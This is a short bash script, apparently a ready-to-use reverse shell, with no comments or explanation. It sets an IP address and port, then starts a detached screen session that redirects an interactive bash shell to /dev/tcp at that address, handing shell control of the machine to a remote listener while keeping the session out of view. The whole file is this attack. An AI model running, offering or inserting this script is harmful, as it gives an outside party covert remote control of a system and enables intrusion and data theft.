#!/bin/bash

ip='192.168.1.1'
port='1234'
screen -md bash -c "bash -i >/dev/tcp/$ip/$port 2>&1 0<&1"
exit
